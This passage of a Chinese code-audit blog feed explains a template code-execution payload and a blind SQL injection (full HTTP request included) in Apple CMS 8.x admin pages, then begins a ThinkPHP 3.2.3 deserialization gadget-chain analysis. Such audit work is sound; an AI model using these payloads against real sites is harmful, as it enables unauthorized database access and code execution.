<p>根据之前的分析，找到/inc/common/vod.php文件的search处：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /inc/module/vod.php</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">elseif</span>($method==<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$tpl-&gt;P[<span class="string">&quot;siteaid&quot;</span>] = <span class="number">15</span>;</span><br><span class="line">	$wd = be(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;wd&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($wd))&#123; $tpl-&gt;P[<span class="string">&quot;wd&quot;</span>] = $wd; &#125;</span><br><span class="line">	<span class="keyword">if</span> ( $tpl-&gt;P[<span class="string">&#x27;pg&#x27;</span>]==<span class="number">1</span> &amp;&amp; getTimeSpan(<span class="string">&quot;last_searchtime&quot;</span>) &lt; $MAC[<span class="string">&#x27;app&#x27;</span>][<span class="string">&#x27;searchtime&#x27;</span>])&#123; </span><br><span class="line">		showMsg(<span class="string">&quot;请不要频繁操作，时间间隔为&quot;</span>.$MAC[<span class="string">&#x27;app&#x27;</span>][<span class="string">&#x27;searchtime&#x27;</span>].<span class="string">&quot;秒&quot;</span>,MAC_PATH);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">if</span> (!isN($tpl-&gt;P[<span class="string">&quot;wd&quot;</span>])) &#123;</span><br><span class="line">    	$tpl-&gt;P[<span class="string">&quot;key&quot;</span>]=$tpl-&gt;P[<span class="string">&quot;wd&quot;</span>] ;</span><br><span class="line">    	$tpl-&gt;P[<span class="string">&quot;des&quot;</span>] = $tpl-&gt;P[<span class="string">&quot;des&quot;</span>] . <span class="string">&quot;&amp;nbsp;名称或主演为&quot;</span> . $tpl-&gt;P[<span class="string">&quot;wd&quot;</span>];</span><br><span class="line">    	$tpl-&gt;P[<span class="string">&quot;where&quot;</span>] = $tpl-&gt;P[<span class="string">&quot;where&quot;</span>] . <span class="string">&quot; AND ( instr(d_name,&#x27;&quot;</span>.$tpl-&gt;P[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&quot;&#x27;)&gt;0 or instr(d_starring,&#x27;&quot;</span>.$tpl-&gt;P[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&quot;&#x27;)&gt;0 ) &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">  $tpl-&gt;H = loadFile(MAC_ROOT_TEMPLATE.<span class="string">&quot;/vod_search.html&quot;</span>);</span><br><span class="line">	$tpl-&gt;mark();</span><br><span class="line">	$tpl-&gt;pageshow();</span><br><span class="line">	</span><br><span class="line">	$colarr = <span class="keyword">array</span>(<span class="string">&#x27;&#123;page:des&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:key&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:now&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:order&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:by&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:wd&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:wdencode&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:pinyin&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:letter&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:year&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:starring&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:starringencode&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:directed&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:directedencode&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:area&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:areaencode&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:lang&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:langencode&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:typeid&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:typepid&#125;&#x27;</span>,<span class="string">&#x27;&#123;page:classid&#125;&#x27;</span>);</span><br><span class="line">	$valarr = <span class="keyword">array</span>($tpl-&gt;P[<span class="string">&quot;des&quot;</span>],$tpl-&gt;P[<span class="string">&quot;key&quot;</span>],$tpl-&gt;P[<span class="string">&quot;pg&quot;</span>],$tpl-&gt;P[<span class="string">&quot;order&quot;</span>],$tpl-&gt;P[<span class="string">&quot;by&quot;</span>],$tpl-&gt;P[<span class="string">&quot;wd&quot;</span>],urlencode($tpl-&gt;P[<span class="string">&quot;wd&quot;</span>]),$tpl-&gt;P[<span class="string">&quot;pinyin&quot;</span>],$tpl-&gt;P[<span class="string">&quot;letter&quot;</span>],$tpl-&gt;P[<span class="string">&#x27;year&#x27;</span>]==<span class="number">0</span>?<span class="string">&#x27;&#x27;</span>:$tpl-&gt;P[<span class="string">&#x27;year&#x27;</span>],$tpl-&gt;P[<span class="string">&quot;starring&quot;</span>],urlencode($tpl-&gt;P[<span class="string">&quot;starring&quot;</span>]),$tpl-&gt;P[<span class="string">&quot;directed&quot;</span>],urlencode($tpl-&gt;P[<span class="string">&quot;directed&quot;</span>]),$tpl-&gt;P[<span class="string">&quot;area&quot;</span>],urlencode($tpl-&gt;P[<span class="string">&quot;area&quot;</span>]),$tpl-&gt;P[<span class="string">&quot;lang&quot;</span>],urlencode($tpl-&gt;P[<span class="string">&quot;lang&quot;</span>]),$tpl-&gt;P[<span class="string">&#x27;typeid&#x27;</span>],$tpl-&gt;P[<span class="string">&#x27;typepid&#x27;</span>] ,$tpl-&gt;P[<span class="string">&#x27;classid&#x27;</span>]  );</span><br><span class="line">	</span><br><span class="line">	$tpl-&gt;H = str_replace($colarr, $valarr ,$tpl-&gt;H);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>也就是说<code>$tpl-&gt;P[&quot;wod&quot;]='&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;'</code>，而且<code>$tpl-&gt;H</code>等于<code>&quot;/template/paody/html/vod_search.html&quot;</code>的内容，<code>$tpl-&gt;P[&quot;key&quot;]</code>等于<code>$tpl-&gt;P[&quot;wod&quot;]</code>。接着<code>$tpl-&gt;H</code>的内容还做了替换，把<code>&#123;type:key&#125;</code>替换成<code>&#123;if-A:phpinfo()&#125;&#123;endif-A&#125;'</code></p>
<p>继续看index.php页面，找到相应模块后，会调用template.php文件中的ifex()函数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111144158.png" alt=""></p>
<p>开头的<code>$this-&gt;H</code>在<code>/inc/module/vod.php</code>文件中已经定义。<code>$labelRule</code>等于<code>/&#123;if-([\s\S]*?):([\s\S]+?)&#125;([\s\S]*?)&#123;endif-\1&#125;/is</code>，然后在<code>$this-&gt;H</code>中用这个pattern匹配，结果是一个二维数组，存储在<code>$iar</code>中。而payload中的phpinfo()将存储在<code>$iar[2]</code>中。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111144944.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111150824.png" alt=""></p>
<h3 id="后台SQL注入">后台SQL注入</h3>
<p>上面我们已经提到过苹果CMS使用be函数来获取参数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111095403.png" alt=""></p>
<p>其中arr情况没有过滤，因此可以寻找一个arr的点。在/admin/tpl/module/art.php文件中存在：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($method==<span class="string">&#x27;typesaveall&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$t_id = be(<span class="string">&#x27;arr&#x27;</span>,<span class="string">&#x27;t_id&#x27;</span>);</span><br><span class="line">	$ids = explode(<span class="string">&#x27;,&#x27;</span>,$t_id);</span><br><span class="line">	<span class="keyword">foreach</span>($ids <span class="keyword">as</span> $id)&#123;</span><br><span class="line">		$t_name = be(<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;t_name&#x27;</span> .$id);</span><br><span class="line">		$t_enname = be(<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;t_enname&#x27;</span> .$id) ;</span><br><span class="line">		$t_sort = be(<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;t_sort&#x27;</span> .$id);</span><br><span class="line">		$t_tpl = be(<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;t_tpl&#x27;</span> .$id);</span><br><span class="line">		$t_tpl_art = be(<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;t_tpl_art&#x27;</span> .$id);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (isN($t_name)) &#123; $t_name=<span class="string">&#x27;未知&#x27;</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span> (isN($t_enname)) &#123; $t_enname=<span class="string">&#x27;weizhi&#x27;</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span> (!isNum($t_sort)) &#123; $t_sort=<span class="number">0</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span> (isN($t_tpl)) &#123; $t_tpl = <span class="string">&#x27;artlist.html&#x27;</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span> (isN($t_tpl_art)) &#123; $t_tpl_art = <span class="string">&#x27;art.html&#x27;</span>;&#125;</span><br><span class="line">		</span><br><span class="line">		$db-&gt;Update (<span class="string">&#x27;&#123;pre&#125;art_type&#x27;</span>,<span class="keyword">array</span>(<span class="string">&#x27;t_name&#x27;</span>,<span class="string">&#x27;t_enname&#x27;</span>, <span class="string">&#x27;t_sort&#x27;</span>,<span class="string">&#x27;t_tpl&#x27;</span>,<span class="string">&#x27;t_tpl_art&#x27;</span>),<span class="keyword">array</span>($t_name,$t_enname,$t_sort,$t_tpl,$t_tpl_art),<span class="string">&#x27;t_id=&#x27;</span>.$id);</span><br><span class="line">	&#125;</span><br><span class="line">	updateCacheFile();</span><br><span class="line">	redirect( getReferer() );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$t_id参数使用了arr方法，并且代入了SQL语句中，但是POST存在如下过滤：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$postfilter=<span class="string">&quot;^\\+\/v(8|9)|\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|&lt;\\s*img\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>可以使用布尔盲注，另外不能使用逗号。substring方法的from…for…可以绕过逗号 的限制：<code>SELECT SUBSTRING('Sakila' FROM -4 FOR 2);</code>。payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;index.php?m&#x3D;art-typesaveall HTTP&#x2F;1.1</span><br><span class="line">Host: maccms:8888</span><br><span class="line">Content-Length: 895</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;maccms:8888</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;maccms:8888&#x2F;admin&#x2F;index.php?m&#x3D;art-type</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;adb86684e6ee83c4ff53caf12c86a13a; adminid&#x3D;1; adminname&#x3D;admin; adminlevels&#x3D;b%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj; admincheck&#x3D;a2355a779d57666d1b72a1845c1f469c</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">t_id%5B%5D&#x3D;1&amp;t_sort1&#x3D;1&amp;t_name1&#x3D;%E7%AB%99%E5%86%85%E6%96%B0%E9%97%BB&amp;t_enname1&#x3D;zhanneixinwen&amp;t_tpl1&#x3D;art_type.html&amp;t_tpl_art1&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;2&amp;t_sort2&#x3D;2&amp;t_name2&#x3D;%E5%A8%B1%E4%B9%90%E5%8A%A8%E6%80%81&amp;t_enname2&#x3D;yuledongtai&amp;t_tpl2&#x3D;art_type.html&amp;t_tpl_art2&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;3&amp;t_sort3&#x3D;3&amp;t_name3&#x3D;%E5%85%AB%E5%8D%A6%E7%88%86%E6%96%99&amp;t_enname3&#x3D;baguabaoliao&amp;t_tpl3&#x3D;art_type.html&amp;t_tpl_art3&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;4&amp;t_sort4&#x3D;4&amp;t_name4&#x3D;%E5%BD%B1%E7%89%87%E8%B5%84%E8%AE%AF&amp;t_enname4&#x3D;yingpianzixun&amp;t_tpl4&#x3D;art_type.html&amp;t_tpl_art4&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;5&amp;t_sort5&#x3D;5&amp;t_name5&#x3D;%E6%98%8E%E6%98%9F%E8%B5%84%E8%AE%AF&amp;t_enname5&#x3D;mingxingzixun&amp;t_tpl5&#x3D;art_type.html&amp;t_tpl_art5&#x3D;art_detail.html&amp;t_id%5B%5D&#x3D;7 or 1 &#x3D; (select ord(substring(user() from 1 for 1))&#x3D;114)-- 1&amp;t_sort6&#x3D;6&amp;t_name6&#x3D;%E7%94%B5%E8%A7%86%E8%B5%84%E8%AE%AF&amp;t_enname6&#x3D;dianshizixun&amp;t_tpl6&#x3D;art_type.html&amp;t_tpl_art6&#x3D;art_detail.html</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111162754.png" alt=""></p>
<p>此为正确查询，会把所有的条目都修改掉：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210111162709.png" alt=""></p>
<h2 id="Reference">Reference</h2>
<p><a href="https://mochazz.github.io/2018/03/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E8%8B%B9%E6%9E%9Ccms8.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/">https://mochazz.github.io/2018/03/06/代码审计之苹果cms8.x代码执行（复现）/</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>TP3.0反序列化POP链+MySQL伪造恶意服务端</title>
    <url>/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF/</url>
    <content><![CDATA[<h1 id="TP3-0反序列化POP链-MySQL伪造恶意服务端">TP3.0反序列化POP链+MySQL伪造恶意服务端</h1>
<blockquote>
<p>Reference: 米斯特安全团队 <a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p>
</blockquote>
<h2 id="测试环境">测试环境</h2>
<ul>
<li>OS: <code>MAC OS</code></li>
<li>PHP: <code>5.6.40</code></li>
<li>ThinkPHP: <code>3.2.3</code></li>
</ul>
<h2 id="环境搭建">环境搭建</h2>
<p>使用composer拉取源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project topthink&#x2F;thinkphp&#x3D;3.2.3 tp3</span><br></pre></td></tr></table></figure>
<p>框架会生成一个默认的控制器，访问首页显示<code>欢迎使用ThinkPHP！</code>。</p>
<p>更改这个默认的控制器：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120114943.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115003.png" alt=""></p>
<h2 id="POP链分析">POP链分析</h2>
<h3 id="起点">起点</h3>
<p>文件：<code>/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115132.png" alt=""></p>
<p><code>img</code>参数可控，这里有两个思路，一是可以接着寻找<code>destroy()</code>函数，二是可以寻找不存在<code>destroy()</code>函数的类从而触发<code>__call()</code>方法。</p>
<h3 id="跳板1">跳板1</h3>
<p>首先还是全局查找<code>function destroy(</code>，找到一个可用的跳板类。</p>
<p>文件：<code>/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115536.png" alt=""></p>
<p>这里的<code>$this-&gt;handle</code>可控，并且调用了<code>$this-&gt;handle</code>的<code>delete()</code>方法，且传过去的参数是部分可控的，因此我们可以继续寻找有<code>delete()</code>方法的跳板类。</p>
<p>有点问题的地方在于这里的<code>destroy()</code>方法需要传入一个<code>$sessID</code>，但是前面<code>Imagick::__destruct</code>中调用<code>destroy()</code>方法的时候并没有传值，在PHP7的版本下会抛出异常。</p>
<h3 id="跳板2">跳板2</h3>
<p>全局搜索<code>function delete(</code>，找到一个<code>Model</code>类。</p>
<p>文件：<code>/ThinkPHP/Library/Think/Model.class.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">$options = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pk = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$pk])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[$pk]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($options) || is_string($options)) &#123;</span><br><span class="line">            <span class="comment">// 根据主键删除记录</span></span><br><span class="line">            <span class="keyword">if</span> (strpos($options, <span class="string">&#x27;,&#x27;</span>)) &#123;</span><br><span class="line">                $where[$pk] = <span class="keyword">array</span>(<span class="string">&#x27;IN&#x27;</span>, $options);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $where[$pk] = $options;</span><br><span class="line">            &#125;</span><br><span class="line">            $options          = <span class="keyword">array</span>();</span><br><span class="line">            $options[<span class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据复合主键删除记录</span></span><br><span class="line">        <span class="keyword">if</span> (is_array($options) &amp;&amp; (count($options) &gt; <span class="number">0</span>) &amp;&amp; is_array($pk)) &#123;</span><br><span class="line">            $count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (array_keys($options) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_int($key)) &#123;</span><br><span class="line">                    $count++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (count($pk) == $count) &#123;</span><br><span class="line">                $i = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">foreach</span> ($pk <span class="keyword">as</span> $field) &#123;</span><br><span class="line">                    $where[$field] = $options[$i];</span><br><span class="line">                    <span class="keyword">unset</span>($options[$i++]);</span><br><span class="line">                &#125;</span><br><span class="line">                $options[<span class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分析表达式</span></span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($options[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($options[<span class="string">&#x27;where&#x27;</span>][$pk])) &#123;</span><br><span class="line">            $pkValue = $options[<span class="string">&#x27;where&#x27;</span>][$pk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;_before_delete($options)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;db-&gt;delete($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== $result &amp;&amp; is_numeric($result)) &#123;</span><br><span class="line">            $data = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($pkValue)) &#123;</span><br><span class="line">                $data[$pk] = $pkValue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_after_delete($data, $options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回删除记录个数</span></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>$pk</code>其实就是<code>$this-&gt;pk</code>，是完全可控的。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120120035.png" alt=""></p>
<p>首先来看第一个if语句，<code>$options</code>是从跳板1传过来的，在跳板1中可以控制其是否为空。<code>$this-&gt;options['where']</code>是成员属性，是可控的，而且嵌套的if语句中<code>data</code>参数也是可控的，那么符合条件后，又调用了一次自己<code>$this-&gt;delete()</code>，但是这时候的参数<code>$this-&gt;data[$pk]</code>是我们可控的。</p>
<p>这时<code>delete()</code>我们就可以成功带完全可控参数访问了。</p>
<p>最终这个函数会调用具体数据库驱动类中的<code>delete()</code>中去，即：<code>$result = $this-&gt;db-&gt;delete($options);</code>，那么这时候我们就可以调用任意自带的数据库类中的<code>delete()</code>方法了。</p>
<h3 id="终点">终点</h3>
<p>文件：<code>/ThinkPHP/Library/Think/Db/Driver.class.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120121706.png" alt=""></p>
<p><code>$table</code>是可控的，将<code>$table</code>拼接到<code>$sql</code>传入了<code>$this-&gt;execute()</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$str, $fetchSql = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;queryStr = $str;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind)) &#123;</span><br><span class="line">            $that           = <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr = strtr(<span class="keyword">$this</span>-&gt;queryStr, array_map(<span class="function"><span class="keyword">function</span> (<span class="params">$val</span>) <span class="title">use</span> (<span class="params">$that</span>) </span>&#123;<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . $that-&gt;escapeString($val) . <span class="string">&#x27;\&#x27;&#x27;</span>;&#125;, <span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($fetchSql) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;queryStr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//释放前次的查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;PDOStatement)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;free();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;executeTimes++;</span><br><span class="line">        N(<span class="string">&#x27;db_write&#x27;</span>, <span class="number">1</span>); <span class="comment">// 兼容代码</span></span><br><span class="line">        <span class="comment">// 记录开始执行时间</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;debug(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;PDOStatement = <span class="keyword">$this</span>-&gt;_linkID-&gt;prepare($str);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;PDOStatement) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;bind <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($val)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val[<span class="number">0</span>], $val[<span class="number">1</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;execute();</span><br><span class="line">            <span class="comment">// 调试结束</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;debug(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === $result) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;numRows = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;rowCount();</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\s*(INSERT\s+INTO|REPLACE\s+INTO)\s+/i&quot;</span>, $str)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;lastInsID = <span class="keyword">$this</span>-&gt;_linkID-&gt;lastInsertId();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;numRows;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>函数开头第一行先调用<code>initConnect()</code>初始化数据库连接：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122004.png" alt=""></p>
<p>可以通过控制成员属性，使程序调用到<code>$this-&gt;connect()</code>。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122054.png" alt=""></p>
<p>通过<code>$this-&gt;config</code>里的配置去创建了数据库连接，接着去执行前面拼接的<code>DELETE</code>SQL语句。</p>
<p>所以这条POP链的功能就在于可以连接任意数据库，再利用delete注入。</p>
<h2 id="漏洞利用">漏洞利用</h2>
